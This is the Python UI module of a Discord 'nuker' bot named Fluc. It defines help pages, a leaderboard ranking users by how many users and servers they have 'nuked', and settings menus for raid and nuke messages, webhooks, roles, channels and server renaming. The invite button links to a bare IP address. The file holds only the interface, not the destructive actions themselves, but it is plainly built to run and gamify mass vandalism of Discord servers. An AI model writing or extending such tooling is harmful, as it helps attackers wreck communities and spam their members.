#pyright: reportFunctionMemberAccess=false
#pyright: reportAttributeAccessIssue=false

import discord

from PIL import Image
from io import BytesIO
from aiohttp import ClientSession
from discord.ext import commands

from bots.shared.root import Cooldowns, Emojis
from etc.database import Database

from bots.shared.settings import *

from typing import (
    List,
    Optional,
    Tuple,
    Type,
    Any
)


database: Database
session: ClientSession
cooldowns: Cooldowns
fluc: commands.Bot
emojis: Emojis



def embed(*, description: Optional[str] = None, title: Optional[str] = None, emoji: bool = True, **kwargs) -> discord.Embed:
    color = kwargs.pop('color', None)

    if title and not color:
        if title.lower() in ('error', 'warning'):
            if title.lower() == 'error':
                color = discord.Color.red()

            else:
                color = discord.Color.yellow()
    
    if description and emoji is True:
        if title and title.lower() == 'error':
            description = f'{emojis.cross} {description}'

        else:
            description = f'{emojis.check} {description}'
    return discord.Embed(title=title, description=description, color=color, **kwargs)


class HelpMenu(discord.ui.View):
    def __init__(self, commands_list: List[commands.Command], *, show_all: bool = False):
        super().__init__(timeout=None)
        if not show_all:
            commands_list = [cmd for cmd in commands_list if not cmd.hidden]
        # Originally bot.commands is a set
        self.commands_list: List[commands.Command] = list(commands_list)
        self.page: int = 0
        self.per_page: int = 9
        self.max_pages: int = (len(commands_list) - 1) // self.per_page
        self.next.disabled = len(commands_list) <= self.per_page


    def generate_embed(self) -> discord.Embed:
        start = self.page * self.per_page
        end = start + self.per_page
        _embed = embed(
            title="Fluc commands",
            description=(
                f'` help [command] ` for more information about a specific command.\n\n'
            )
        )

        for cmd in self.commands_list[start:end]:
            _embed.add_field(
                name=f'📁 **{cmd.name}**',
                value=f'**Aliases: ` {', '.join(cmd.aliases)} `**'
            )

        _embed.set_footer(text=f'Page {self.page + 1} of {self.max_pages + 1} | A bot powered by Fluc')
        return _embed
    

    async def update_message(self, interaction: discord.Interaction):
        await interaction.response.edit_message(embed=self.generate_embed(), view=self)


    @discord.ui.button(label='⬅️ Previous', style=discord.ButtonStyle.secondary, disabled=True, custom_id='button1')
    async def previous(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page -= 1
        if self.page == 0:
            self.previous.disabled = True
        
        self.next.disabled = False
        await self.update_message(interaction)


    @discord.ui.button(label='➡️ Next', style=discord.ButtonStyle.secondary, custom_id='button2')
    async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page += 1
        if self.page == self.max_pages:
            self.next.disabled = True
            
        self.previous.disabled = False
        await self.update_message(interaction)



class ManagerHelpMenu(HelpMenu):
    ...



class Leaderboard(discord.ui.View):
    page: int
    per_page: int
    max_pages: int

    def __init__(self):
        super().__init__(timeout=None)
        self.page = 0
        self.per_page = 10
        self.max_pages = min(10, len(database.users) // self.per_page)


    async def generate_embed(self, *, sort_by: str = 'server_amount') -> Optional[Tuple[discord.Embed, Optional[discord.File]]]:
        labels = []
        user_data = []
        server_data = []
        file: Optional[discord.File] = None
        start = self.page * 10

        top = await database.get_top(sort_by, limit=self.per_page, start_from=start)
        _embed = embed(description='Leaderboard $ top 10 n#kers')
        if not top:
            return

        for i, user in enumerate(top, 1):
            discord_user = fluc.get_user(user.id)
            if discord_user:
                user_name = discord_user.name
            
            else:
                user_name = str(user.id)

            if len(user_name) > 10:
                user_name = f'{user_name[:10]}...'

            labels.append(user_name)
            user_data.append(user.user_amount)
            server_data.append(user.server_amount)

            name = f'{i}. <@{user.id}>'
            
            if start == 0:
                name = list(name)
                
                if i == 1:
                    name.insert(0, '🥇 ')

                elif i == 2:
                    name.insert(0, '🥈 ')

                elif i == 3:
                    name.insert(0, '🥉 ')
                name = ''.join(name)

            _embed.add_field(
                name='',
                value=(
                    f'{name}\n'
                    f'💥 N#ked users: ` {user.user_amount} `\n'
                    f'💥 N#ked servers: ` {user.server_amount} `'
                ),
                inline=False
            )

        data = {
            'type': 'bar',
            'data': {
                'labels': labels,
                'datasets': [
                    {
                        'label': 'Nuked Users',
                        'data': user_data,
                        'backgroundColor': 'rgba(75, 192, 192, 0.6)'
                    },
                    {
                        'label': 'Nuked Servers',
                        'data': server_data,
                        'backgroundColor': 'rgba(255, 99, 132, 0.6)'
                    }
                ]
            },
            'options': {
                # 'true' instead of True because it's sent as raw string
                'responsive': 'true',
                'title': {
                    'display': 'true',
                    'text': 'Top 10 Fluc nukers',
                },
                'plugins': {
                    'legend': {
                        'position': 'top'
                    }
                }
            }
        }

        # json_data = {
        #     'chart': data,
        #     'width': 800,
        #     'height': 400,
        #     'format': 'png'
        # }

        # headers = {
        #     'Content-Type': 'application/json'
        # }

        # API Update    
        # async with session.post('https://quickchart.io/chart', json=json_data, headers=headers) as response:
        async with session.get(f'https://quickchart.io/chart?c={data}') as response:
            if response.status in (200, 400):
                # It returns errors in the image (if any)..
                content = await response.content.read()
                chart = BytesIO(content)
                chart.seek(0)

                image = Image.open(chart)
                image = image.convert('RGBA')
                pixels = image.load()

                # Basically what this does is that it fills
                # the background with red color
                for y in range(image.height):
                    for x in range(image.width):
                        if pixels:
                            a = pixels[x, y][3]
                            if a == 0:
                                # Change pixel x, y to color red
                                pixels[x, y] = (0, 0, 0, 255)

                output = BytesIO()
                image.save(output, format='png')
                output.seek(0)

                file = discord.File(output, filename='leaderboard.png')
        return _embed, file
    

    async def update_message(self, interaction: discord.Interaction):
        result = await self.generate_embed()
        if not result:
            return
        
        embed, _ = result

        if embed:
            await interaction.response.edit_message(embed=embed, view=self)
    
    
    @discord.ui.button(label='⬅️ Previous', style=discord.ButtonStyle.secondary, disabled=True, custom_id='button1')
    async def previous(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page -= 1
        if self.page == 0:
            self.previous.disabled = True
        
        self.next.disabled = False
        await self.update_message(interaction)


    @discord.ui.button(label='➡️ Next', style=discord.ButtonStyle.secondary, custom_id='button2')
    async def next(self, interaction: discord.Interaction, button: discord.ui.Button):
        self.page += 1
        if self.page == self.max_pages:
            self.next.disabled = True
            
        self.previous.disabled = False
        await self.update_message(interaction)



class SettingsMenu(ui.Select):
    def __init__(self, settings: Settings, user_id: int):
        super().__init__()
        self.settings: Settings = settings
        self.user_id: int = user_id

        dropdown = ui.Select(placeholder='Select a Category', min_values=1, max_values=1)
        dropdown.add_option(label='Reasons', emoji='👨‍💼', value='0')
        dropdown.add_option(label='Channel', emoji='📢', value='1')
        dropdown.add_option(label='Webhook', emoji='✉', value='2')
        dropdown.add_option(label='Role', emoji='🎟', value='3')
        dropdown.add_option(label='Emoji', emoji='🙂', value='4')
        dropdown.add_option(label='Sticker', emoji='🖼', value='5')
        dropdown.add_option(label='Member', emoji='📝', value='6')
        dropdown.add_option(label='Guild', emoji='💻', value='7')
        dropdown.add_option(label='Message', emoji='🗣', value='8')
        dropdown.add_option(label='Prefix', emoji='❓', value='9')
        dropdown.add_option(label='Reset Settings', emoji='🔃', value='10')
        dropdown.callback = self.callback
        self.add_item(dropdown) # type: ignore


    async def callback(self, interaction: Interaction):
        if not interaction.user.id == self.user_id:
            await interaction.response.send_message(embed=Embed(
                title='Error',
                description='Use .settings to customize your settings!',
                color=discord.Color.red()
            ))
            return
        
        if not interaction.data:
            return
        
        choice = int(interaction.data.get('values', [])[0])
        message: List[Union[Optional[Type[Modal]], str]] = []

        match choice:
            case 0:
                message = [
                    ReasonModal,
                    'Customize Reasons',
                    'Reasons will appear in the audit logs when actions are performed.\n'
                    '- *Reasons: A list of reasons that will be shown in the audit logs.\n'
                ]
            
            case 1:
                message = [
                    ChannelModal,
                    'Channel Settings',
                    'These settings apply when creating or editing channels.\n'
                    '- *Names: A list of channel names.\n'
                    '- *Topic: A list of channel topics.\n'
                    r'- *\*NSFW: Whether the channel should be marked as age restricted.\n'
                    '- *Slowmode Delay: Channel slowmode delay in seconds.'
                ]

            case 2:
                message = [
                    WebhookModal,
                    'Webhook settings',
                    'These settings apply when creating webhook\n'
                    '- *Names: A list of names for the webhooks'
                ]

            case 3:
                message = [
                    RoleModal,
                    'Role Settings',
                    'These settings apply when creating or editing roles.\n'
                    '- *Names: A list of role names.\n'
                    r'- \* *\*\*Permissions: A list of role permission values.\n'
                    r'- \* *\*\*Colors: A list of HEX colors for roles.\n'
                    r'- *\*Hoist: Whether the role should be displayed separately.\n'
                    r'- *\*Mentionable: Whether the role should be mentionable.'
                ]

            case 4:
                message = [
                    EmojiModal,
                    'Emoji Settings',
                    'These settings apply when creating emojis.\n'
                    r'- *Names: A list of emoji names.\n'
                    r'- \* *\*\*Images: URLs (including https://) for emoji icons.'
                ]

            case 5:
                message = [
                    StickerModal,
                    'Sticker Settings',
                    'These settings apply when creating stickers.\n'
                    '- *Names: A list of sticker names.\n'
                    '- *Descriptions: Descriptions for the stickers.\n'
                    '- *Emoji: A list of emojis associated with the stickers.\n'
                    r'- \* *\*\*Image: URLs (including https://) for sticker icons.'
                ]

            case 6:
                message = [
                    MemberModal,
                    'Member Settings',
                    'These settings apply when editing members.\n'
                    '- *Nicknames: A list of nicknames for members.\n'
                    '- *Timeout Durations: Durations (in seconds) for member timeouts.'
                ]

            case 7:
                message = [
                    GuildModal,
                    'Guild Settings',
                    'These settings apply when editing server info.\n'
                    '- *Names: A list of server names.\n'
                    '- *Icons: URLs (including https://) for server icons.'
                ]

            case 8:
                message = [
                    MessageModal,
                    'Message Settings',
                    'These settings apply when the bot is raiding/nuking.\n'
                    '- *Content: A list of messages the bot will send.\n'
                    r'- *\*Text-To-Speech: Whether the message should use text-to-speech.\n'
                    '- *Usernames: Usernames for the webhooks sending the messages.\n'
                    '- *Avatars: URLs (including https://) for webhook icons.'
                ]

            case 9:
                message = [
                    PrefixModal,
                    'Prefix Settings',
                    'These settings apply when invoking bot commands.\n'
                    '- *Prefixes: A list of prefixes the bot will listen to when running commands.'
                ]

            case 10:
                message = [
                    None,
                    'Reset Settings',
                    ''
                ]

        if message[0]:
            message[2] = str(
                str(message[2]) +
                '\n'
                '**Leave blank for default value.**\n'
                '*Multiple choices - separate each one with `%`. One choice will be picked at random each time.\n'
                r'*\*True = 1, False = 0, Random = 01\n'
                r'*\*\*Do not change this unless you know what you\'re doing.\n\n'
                '!!! The bot does not verify whether the values you enter are correct. If you mess them up, don\'t expect the bot to work !!!'
            )

        self.values: List = []
        await interaction.response.edit_message(view=self.view)

        await interaction.followup.send(
            embed=Embed(
                title=message[1],
                description=message[2]
            ),
            ephemeral=True,
            view=Button(message[0], self.settings, database) # type: ignore
        )



class InviteButtonRedirect(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(
            label='Join Server',
            style=discord.ButtonStyle.url,
            url='http://144.21.56.129:2002/join'
        ))



class InviteButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)


    @discord.ui.button(label='🤖 Invite', style=discord.ButtonStyle.gray, custom_id='inviteButton')
    async def invite(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            _embed = embed(title='Bot Invite', description='Click on the button below to invite bot!')
            await interaction.user.send(embed=_embed, view=InviteButtonRedirect(), delete_after=60)
            await interaction.response.send_message(embed=embed(description='Invite has been sent to your DMs!'), ephemeral=True)

        except discord.Forbidden:
            await interaction.response.send_message(embed=embed(
                title='Error',
                description='You must enable DMs in order to get the invite.'
            ), ephemeral=True)



def ui_init(
    _database: Database,
    _session: ClientSession,
    _cooldowns: Cooldowns,
    _fluc: commands.Bot,
    _emojis: Emojis
):
    global database
    global session
    global cooldowns
    global fluc
    global emojis
    database = _database
    session = _session
    cooldowns = _cooldowns
    fluc = _fluc
    emojis = _emojis